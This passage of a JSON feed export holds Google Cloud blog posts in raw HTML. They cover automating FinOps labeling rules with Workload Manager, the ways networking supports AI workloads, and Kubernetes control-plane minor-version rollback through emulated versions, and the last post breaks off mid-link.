style=\"vertical-align: baseline;\">Automating FinOps policies: A step-by-step guide</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Here’s how you can use Workload Manager to automate your cost management policies.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Step 1: Define your FinOps rules and create a new evaluation</strong></p>\n<p><span style=\"vertical-align: baseline;\">First, you need to translate your cost management policies into a format that the Workload Manager can understand. The tool uses Open Policy Agent (OPA) Rego for defining custom rules. In this blog we will take a primary use case for FinOps — that is, to ensure resources are properly labeled for cost allocation and showback.</span></p>\n<p><span style=\"vertical-align: baseline;\">You can choose from hundreds of </span><a href=\"https://cloud.google.com/workload-manager/docs/reference/best-practices-general\"><span style=\"text-decoration: underline; vertical-align: baseline;\">predefined rules</span></a><span style=\"vertical-align: baseline;\"> authored by Google Cloud experts that cover FinOps, reliability, security, and operations according to the Google Cloud best practices or create and customize your own rules (checkout examples from the </span><a href=\"https://github.com/GoogleCloudPlatform/workload-manager/tree/main/rules\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud GitHub repository</span></a><span style=\"vertical-align: baseline;\">). In our example we will use one of the predefined ‘Google Cloud Best Practices’ rules for bigquery-missing-labels on a dataset. In this case, navigate to the Workload Manager section in your Google Cloud Console and start by creating a new evaluation.</span></p>\n<p><span style=\"vertical-align: baseline;\">Give your evaluation a name and select \"Custom\" as the workload type. This is where you can point Workload Manager to the Cloud Storage bucket that contains your custom FinOps rules if you’ve built one. The experience allows you to run both pre-defined and custom rule checks in one evaluation.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Figure - 2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_-_2.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 2 - Creating new evaluation rule</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">Step 2: Define the scope of your scan</strong></p>\n<p><span style=\"vertical-align: baseline;\">Next, define the scope of your evaluation. You have the flexibility to scan your entire Google Cloud organization, specific folders, or individual projects. This allows you to apply broad cost-governance policies organization-wide, or create more targeted rules for specific teams or environments. You can also apply filters based on resource labels or names for more granular control. In this example, region selection lets you select where you want to process your data to meet data residency requirements.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Figure - 3\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_-_3.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 3 - Selecting scope and location for your evaluation rule</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">Step 3: Schedule and notify</strong></p>\n<p><span style=\"vertical-align: baseline;\">With FinOps, automation is key. You can schedule your evaluation to run at a specific cadence, from hourly to monthly. This helps ensure continuous monitoring and provides a historical record of your policy compliance. Optionally, but highly recommended for FinOps, you can configure the evaluation to save all results to a BigQuery dataset for historical analysis and reporting. </span></p>\n<p><span style=\"vertical-align: baseline;\">You can also set up notifications to alert the right teams when an issue is found. Channels include email, Slack, PagerDuty, and more, so that policy violations can be addressed promptly.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"figure - 4\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/figure_-_4.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 4 - Export, schedule and notify evaluation rules</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">Step 4: Run, review, and report</strong></p>\n<p><span style=\"vertical-align: baseline;\">Once saved, the evaluation will run on your defined schedule, or you can trigger it on-demand. The results of each scan are stored, providing a historical view of your compliance posture</span></p>\n<p><span style=\"vertical-align: baseline;\">From the Workload Manager dashboard, you can see a summary of scanned resources, issues found, and trends over time. For deeper analysis, you can explore the violation data directly in the BigQuery dataset you configured earlier.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"figure - 5\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/figure_-_5.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure - 5: Checkout evaluations for workload manager</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Visualize findings with Looker Studio</strong></h3>\n<p><span style=\"vertical-align: baseline;\">To make the data accessible and actionable for all stakeholders, you can easily connect your BigQuery results to Looker Studio. Create interactive dashboards that visualize your FinOps policy violations, such as assets missing required labels or resources that don't comply with cost-saving rules. This provides a clear, at-a-glance view of your cost governance status.</span></p>\n<p><span style=\"vertical-align: baseline;\">You can find Looker Studio template in template gallery and easily connect it with your datasets and modify as needed. Here is how you can use it:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Go to Looker studio. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Navigate to Templates and under Bigquery, select </span><a href=\"https://lookerstudio.google.com/c/reporting/e146051d-f7fd-406c-a62c-290fa2fee749/preview/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Workload Manager</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Click on “Use your own Data” that asks for connecting the Bigquery table generated in previous steps. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">After you have connected the Bigquery dataset,  lick on Edit to create a customizable copy to incorporate any changes or share it with your team. </span></p>\n</li>\n</ol></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"figure 6\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/figure_6_rqgAwFk.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure - 6: Set up preconfigured Looker Studio dashboard for reporting</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Take control of your cloud costs today</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Stop the endless cycle of manual cloud cost management. With Workload Manager, you can embed your FinOps policies directly into your cloud environment, automate enforcement, and provide teams with the feedback they need to stay on budget. </span></p>\n<p><span style=\"vertical-align: baseline;\">Ready to get started? Explore the </span><a href=\"https://github.com/GoogleCloudPlatform/workload-manager\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">sample policies on GitHub</span></a><span style=\"vertical-align: baseline;\"> and check out the </span><a href=\"https://cloud.google.com/workload-manager/docs/evaluate/custom-rules/about-custom-rules\"><span style=\"text-decoration: underline; vertical-align: baseline;\">official documentation</span></a><span style=\"vertical-align: baseline;\"> to begin automating your FinOps framework today, and take advantage of Workload Manager’s new pricing.</span></p>\n<p><span style=\"vertical-align: baseline;\">Check out a quick overview video on how Workload Manager Evaluations helps you do a lot more across Security, Reliability and FinOps.</span></p></div>\n<div class=\"block-video\">\n\n\n\n<div class=\"article-module article-video \">\n  <figure>\n    <a class=\"h-c-video h-c-video--marquee\" href=\"https://youtube.com/watch?v=sWwvdkLyA6A\">\n\n      \n        \n\n        <div class=\"article-video__aspect-image\">\n          <span class=\"h-u-visually-hidden\">Google Cloud Configuration Management with Workload Manager</span>\n        </div>\n      \n      <svg class=\"h-c-video__play h-c-icon h-c-icon--color-white\" xmlns=\"http://www.w3.org/2000/svg\">\n        <use xlink:href=\"#mi-youtube-icon\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n      </svg>\n    </a>\n\n    \n  </figure>\n</div>\n\n<div class=\"h-c-modal--video\">\n   <a class=\"glue-yt-video\" href=\"https://youtube.com/watch?v=sWwvdkLyA6A\">\n   </a>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Then, review the updated </span><a href=\"https://cloud.google.com/workload-manager/pricing\"><span style=\"text-decoration: underline; vertical-align: baseline;\">pricing</span></a><span style=\"vertical-align: baseline;\"> to learn more.</span></p></div>",
        "published_date": "2025-11-04 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/networking/how-google-cloud-networking-supports-your-ai-workloads/",
        "title": "7 ways networking powers your AI workloads on Google Cloud",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/0-way-ai-hero.max-600x600.png",
        "author": "Ammett Williams",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">When we talk about artificial intelligence (AI), we often focus on the models, the powerful TPUs and GPUs, and the massive datasets. But behind the scenes, there's an unsung hero making it all possible: </span><strong style=\"vertical-align: baseline;\">networking</strong><span style=\"vertical-align: baseline;\">. While it's often abstracted away, networking is the crucial connective tissue that enables your AI workloads to function efficiently, securely, and at scale.</span></p>\n<p><span style=\"vertical-align: baseline;\">In this post, we explore seven key ways networking interacts with your AI workloads on Google Cloud, from accessing public APIs to enabling next-generation, AI-driven network operations.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">#1 - Securely accessing AI APIs</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Many of the powerful AI models available today, like Gemini on Vertex AI, are accessed via public APIs. When you make a call to an endpoint like </span><code style=\"vertical-align: baseline;\">*-aiplatform.googleapis.com</code><span style=\"vertical-align: baseline;\">, you're dependent on a reliable network connection. To gain access these endpoints require proper authentication. This ensures that only authorized users and applications can access these powerful models, helping to safeguard your data and your AI investments. You can also access these endpoints privately, which we will see in more detail in point # 5.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">#2 - Exposing models for inference</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Once you've trained or tuned your model, you need to make it </span><a href=\"https://cloud.google.com/vertex-ai/docs/general/deployment\"><span style=\"text-decoration: underline; vertical-align: baseline;\">available for inference</span></a><span style=\"vertical-align: baseline;\">. In addition to managed offerings in Google Cloud, you also have the flexibility to deploy your models on infrastructure you control, using specialized </span><a href=\"https://cloud.google.com/compute/docs/gpus#gpu-models\"><span style=\"text-decoration: underline; vertical-align: baseline;\">VM families with powerful GPUs</span></a><span style=\"vertical-align: baseline;\">. For example, you can deploy your model on </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/concepts/kubernetes-engine-overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Kubernetes Engine (GKE)</span></a><span style=\"vertical-align: baseline;\"> and use the </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/concepts/about-gke-inference-gateway\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GKE Inference Gateway</span></a><span style=\"vertical-align: baseline;\">, Cloud Load Balancing, or a ClusterIP to expose it for private or public inference. These networking components act as the entry point for your applications, allowing them to interact with your model deployments seamlessly and reliably.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">#3 - High-speed GPU-to-GPU communication</strong></h3>\n<p><span style=\"vertical-align: baseline;\">AI workloads, especially training, involve moving massive amounts of data between GPUs. Traditional networking, which relies on CPU copy operations, can create bottlenecks. This is where protocols like </span><strong style=\"vertical-align: baseline;\">Remote Direct Memory Access</strong><span style=\"vertical-align: baseline;\"> (</span><strong style=\"vertical-align: baseline;\">RDMA) </strong><span style=\"vertical-align: baseline;\">come in. RDMA bypasses the CPU, allowing for direct memory-to-memory communication between GPUs.</span></p>\n<p><span style=\"vertical-align: baseline;\">To support this, the underlying network must be lossless and high-performance. Google has built out a </span><a href=\"https://cloud.google.com/compute/docs/gpus/gpu-network-bandwidth#h200-gpus\"><span style=\"text-decoration: underline; vertical-align: baseline;\">non-blocking rail-aligned network topology</span></a><span style=\"vertical-align: baseline;\"> in its data center architecture to support RDMA communication and node scaling. Several high-performance GPU VM families support </span><a href=\"https://cloud.google.com/vpc/docs/network-profiles#about_network_profiles\"><span style=\"text-decoration: underline; vertical-align: baseline;\">RDMA over Converged Ethernet (RoCEv2)</span></a><span style=\"vertical-align: baseline;\">, providing the speed and efficiency needed for demanding AI workloads.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">#4 - Data ingestion and storage connectivity</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Your AI models are only as good as the data they're trained on. This data needs to be stored, accessed, and retrieved efficiently. Google Cloud offers a variety of storage options, for example </span><a href=\"https://cloud.google.com/architecture/ai-ml/storage-for-ai-ml#review-storage-options\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Storage</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://cloud.google.com/architecture/ai-ml/storage-for-ai-ml#review-storage-options\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Hyperdisk ML</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://cloud.google.com/architecture/ai-ml/storage-for-ai-ml#review-storage-options\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Managed Lustre</span></a><span style=\"vertical-align: baseline;\">. Networking is what connects your compute resources to your data. Whether you're accessing data directly or over the network, having a high-throughput, low-latency connection to your storage is essential for keeping your AI pipeline running smoothly.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">#5 - Private connectivity to AI workloads</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Security is paramount, and you often need to ensure that your AI workloads are not exposed to the public internet. Google Cloud provides several ways to achieve private communication to both managed Vertex AI services and your own DIY AI deployments. These include:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/vpc-service-controls/docs/overview\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">VPC Service Controls</strong></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> Creates a service perimeter to prevent data exfiltration.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/vpc/docs/private-service-connect\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Private Service Connect</strong></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> Allows you to access Google APIs and managed services privately from your VPC. You can use PSC endpoints to connect to your own services or Google services.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/dns/docs/best-practices\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Cloud DNS</strong></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> </span><a href=\"https://cloud.google.com/vpc/docs/configure-private-service-connect-services#configure-dns-manual\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Private DNS zones</span></a><span style=\"vertical-align: baseline;\"> can be used to resolve internal IP addresses for your AI services.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">#6 - Bridging the gap with hybrid cloud connections</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Many enterprises have a hybrid cloud strategy, with sensitive data remaining on-premises. The Cross-Cloud Network allows you to architect your network to provide any-to-any connectivity. With design cases covering </span><a href=\"https://cloud.google.com/architecture/ccn-distributed-apps-design\"><span style=\"text-decoration: underline; vertical-align: baseline;\">distributed applications</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://services.google.com/fh/files/misc/global_front_end_solution_deep_dive.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Global front end</span></a><span style=\"vertical-align: baseline;\">, and </span><a href=\"https://services.google.com/fh/files/misc/cloud_wan_solution_overview.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud WAN</span></a><span style=\"vertical-align: baseline;\">, you can build your architecture securely from on-premises, other clouds or other VPCs to connect to your AI workloads. This hybrid connectivity allows you to leverage the scalability of Google Cloud's AI services while keeping your data secured.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">#7 - The Future: AI-driven network operations</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The relationship between AI and networking is becoming a two-way street. With </span><a href=\"https://cloud.google.com/gemini/docs/overview\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Gemini for Google Cloud</strong></a><span style=\"vertical-align: baseline;\">, network engineers can now use natural language to design, optimize, and troubleshoot their network architectures. This is the first step towards what we call \"agentic networking,\" where autonomous AI agents can proactively detect, diagnose, and even mitigate network issues. This transforms network engineering from a reactive discipline to a predictive and proactive one, ensuring your network is always optimized for your AI workloads.</span></p></div>\n<div class=\"block-video\">\n\n\n\n<div class=\"article-module article-video \">\n  <figure>\n    <a class=\"h-c-video h-c-video--marquee\" href=\"https://youtube.com/watch?v=mNjysmJNmlw\">\n\n      \n        \n\n        <div class=\"article-video__aspect-image\">\n          <span class=\"h-u-visually-hidden\">Google&#x27;s global network demo: fast incident response with autonomous network operations</span>\n        </div>\n      \n      <svg class=\"h-c-video__play h-c-icon h-c-icon--color-white\" xmlns=\"http://www.w3.org/2000/svg\">\n        <use xlink:href=\"#mi-youtube-icon\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n      </svg>\n    </a>\n\n    \n  </figure>\n</div>\n\n<div class=\"h-c-modal--video\">\n   <a class=\"glue-yt-video\" href=\"https://youtube.com/watch?v=mNjysmJNmlw\">\n   </a>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Learn more</strong><span style=\"vertical-align: baseline;\"> </span></h3>\n<p><span style=\"vertical-align: baseline;\">To learn more about networking and AI on Google Cloud dive deeper with the following:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Documentation: </span><a href=\"https://cloud.google.com/ai-hypercomputer/docs/create/create-overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI Hypercomputer</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Codelabs: </span><a href=\"https://codelabs.developers.google.com/codelabs/terraform-gemini-cli-gce-psc\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini CLI on GCE with a Private Service Connect endpoint</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">White paper: </span><a href=\"https://cloud.google.com/resources/content/autonomous-network-operations?hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Leveling up with Autonomous Network Operations</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Want to ask a question, find out more or share a thought? Please connect with me on </span><a href=\"https://www.linkedin.com/in/ammett/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Linkedin</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-related_article_tout\">\n\n\n\n\n\n<div class=\"uni-related-article-tout h-c-page\">\n  <section class=\"h-c-grid\">\n    <a class=\"uni-related-article-tout__wrapper h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n        h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3 uni-click-tracker\" href=\"https://cloud.google.com/blog/products/networking/google-global-network-technology-deep-dive/\">\n      <div class=\"uni-related-article-tout__inner-wrapper\">\n        <p class=\"uni-related-article-tout__eyebrow h-c-eyebrow\">Related Article</p>\n\n        <div class=\"uni-related-article-tout__content-wrapper\">\n          <div class=\"uni-related-article-tout__image-wrapper\">\n            <div class=\"uni-related-article-tout__image\"></div>\n          </div>\n          <div class=\"uni-related-article-tout__content\">\n            <h4 class=\"uni-related-article-tout__header h-has-bottom-margin\">Diving into the technology behind Google&#x27;s AI-era global network</h4>\n            <p class=\"uni-related-article-tout__body\">Google global network’s technology innovations to meet the demands of the AI era.</p>\n            <div class=\"cta module-cta h-c-copy  uni-related-article-tout__cta muted\">\n              <span class=\"nowrap\">Read Article\n                <svg class=\"icon h-c-icon\" xmlns=\"http://www.w3.org/2000/svg\">\n                  <use xlink:href=\"#mi-arrow-forward\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n                </svg>\n              </span>\n            </div>\n          </div>\n        </div>\n      </div>\n    </a>\n  </section>\n</div>\n\n</div>",
        "published_date": "2025-11-04 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/containers-kubernetes/kubernetes-gets-minor-version-rollback/",
        "title": "Upgrading Kubernetes versions just got safer with minor version rollback",
        "thumbnail": null,
        "author": "Wenjia Zhang",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Upgrading a Kubernetes cluster has always been a one-way street: you move forward, and if the control plane has an issue, your only option is to roll forward with a fix. This adds significant risk to routine maintenance, a problem made worse as organizations upgrade more frequently for new AI features while demanding maximum reliability. Today, in partnership with the Kubernetes community, we are introducing a new capability in Kubernetes 1.33 that solves this: Kubernetes control-plane minor-version rollback. For the first time, you have a reliable path to revert a control-plane upgrade, fundamentally changing cluster lifecycle management.</span><span style=\"text-decoration: line-through; vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">This feature is available in open-source Kubernetes, and is integrated and generally available in Google Kubernetes Engine starting in GKE 1.33 soon.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">The challenge: Why were rollbacks so hard?</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Kubernetes' control plane components, especially kube-apiserver and etcd, are stateful and highly sensitive to API version changes. When you upgrade, many new APIs and features are introduced in the new binary. Some data might be migrated to new formats and API versions. Downgrading was unsupported because there was no mechanism to safely revert changes, risking data corruption and complete cluster failure.</span></p>\n<p><span style=\"vertical-align: baseline;\">As a simple example, consider adding a new field to an existing resource. Until now, both the storage and API progressed in a single step, allowing clients to write data to that new field immediately. If a regression was detected, rolling back removed access to that field, but the data written to it would not be garbage-collected. Instead, it would persist silently in etcd. This left the administrator in an impossible situation. Worse, upon a future re-upgrade to that minor version, this stale \"garbage\" data could suddenly become \"alive\" again, introducing potentially problematic and indeterministic behavior.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">The solution: Emulated versions</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The Kubernetes Enhancement Proposal (KEP), </span><a href=\"https://github.com/kubernetes/enhancements/tree/master/keps/sig-architecture/4330-compatibility-versions\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">KEP-4330: Compatibility Versions</span></a><span style=\"vertical-align: baseline;\">, introduces the concept of an \"emulated version\" for the control plane. Contributed by Googlers, this creates a new two-step upgrade process:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Step 1: Upgrade binaries. </strong><span style=\"vertical-align: baseline;\">You upgrade the control plane binary, but the \"emulated version\" stays the same as the pre-upgrade version. At this stage, all APIs, features, and storage data formats remain unchanged. This makes it safe to roll back your control plane to the previously stable version if you find a problem.</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Validate health and check for regressions.</strong><span style=\"vertical-align: baseline;\"> The 1st step creates a safe validation window during which you can verify that it's safe to proceed — for example, making sure your own components or workloads are running healthy under the new binaries and checking for any performance regressions before committing to the new API versions.</span></p>\n</li>\n</ul>\n<li><strong style=\"vertical-align: baseline;\">Step 2:</strong><span style=\"vertical-align: baseline;\"> </span><strong style=\"vertical-align: baseline;\">Finalize upgrade.</strong><span style=\"vertical-align: baseline;\"> After you complete your testing, you \"bump\" the emulated version to the new version. This enables all the new APIs and features of the latest Kubernetes release and completes the upgrade.</span></li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"image1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image1_dq2nDBb.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This two-step process gives you granular control, more observability, and a safe window for rollbacks. If an upgrade has an unexpected issue, you no longer need to scramble to roll forward. You now have a reliable way to revert to a known-good state, stabilize your cluster, and plan your next move calmly. This is all backed by comprehensive testing for the two-step upgrade in both open-source Kubernetes and GKE.</span></p>\n<p><span style=\"vertical-align: baseline;\">Enabling this was a major effort, and we want to thank all the Kubernetes contributors and feature owners whose collective work to test, comply, and adapt their features made this advanced capability a reality.</span></p>\n<p><span style=\"vertical-align: baseline;\">This feature, coming soon to GKE 1.33, gives you a new tool to de-risk upgrades and dramatically shorten recovery time from unforeseen complications.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">A better upgrade experience in OSS Kubernetes</strong></h3>\n<p><span style=\"vertical-align: baseline;\">This rollback capability is just one part of our broader, long-term investment in improving the Kubernetes upgrade experience for the entire community. At Google, we’ve been working upstream on several other critical enhancements to make cluster operations smoother, safer, and more automated. Here are just a few examples:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Support for skip-version upgrades:</strong><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">Our work on KEP-4330 also makes it possible to enable \"skip-level\" upgrades for Kubernetes. This means that instead of having to upgrade sequentially through every minor version (e.g., v1.33 to v1.34 to v1.35), you will be able to upgrade directly from an older version to a newer one, potentially skipping one or more intermediate releases (e.g., v1.33 to v1.35). This aims to reduce the complexity and downtime associated with major upgrades, making the process more efficient and less disruptive for cluster operators.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Coordinated Leader Election (KEP-4355):</strong><span style=\"vertical-align: baseline;\"> This effort ensures that different control plane components (like kube-controller-manager and kube-scheduler) can gracefully handle leadership changes during an upgrade, so that the Kubernetes version skew policy is not violated.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Graceful Leader Transition (KEP-5366):</strong><span style=\"vertical-align: baseline;\"> Building on the above, this allows a leader to cleanly hand off its position before shutting down for an upgrade, enabling zero-downtime transitions for control plane components.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Mixed Version Proxy (KEP-4020):</strong><span style=\"vertical-align: baseline;\"> This feature improves API server reliability in mixed-version clusters (like during an upgrade). It prevents false \"NotFound\" errors by intelligently routing resource requests to a server that recognizes the resource. It also ensures discovery provides a complete list of all resources from all servers in a mixed-version cluster.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Component Health SLIs for Upgrades (KEP-3466):</strong><span style=\"vertical-align: baseline;\"> To upgrade safely, you need to know if the cluster is healthy. This KEP defines standardized Service Level Indicators (SLIs) for core Kubernetes components. This provides a clear, data-driven signal that can be used for automated upgrade canary analysis, stopping a bad rollout before it impacts the entire cluster.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Together, these features represent a major step forward in the maturity of Kubernetes cluster lifecycle management. We are incredibly proud to contribute this work to the open-source community and to bring these powerful capabilities to our GKE customers.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Learn more at KubeCon</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Want to learn more about the open-source feature and how it's changing upgrades? Come say hi to </span><a href=\"https://rsvp.withgoogle.com/events/google-cloud-at-kubecon-north-america-2025\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">our team at KubeCon</span></a><span style=\"vertical-align: baseline;\">! You can find us at booths #200 and #1100 and at a variety of sessions, including:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://sched.co/27dCm\" 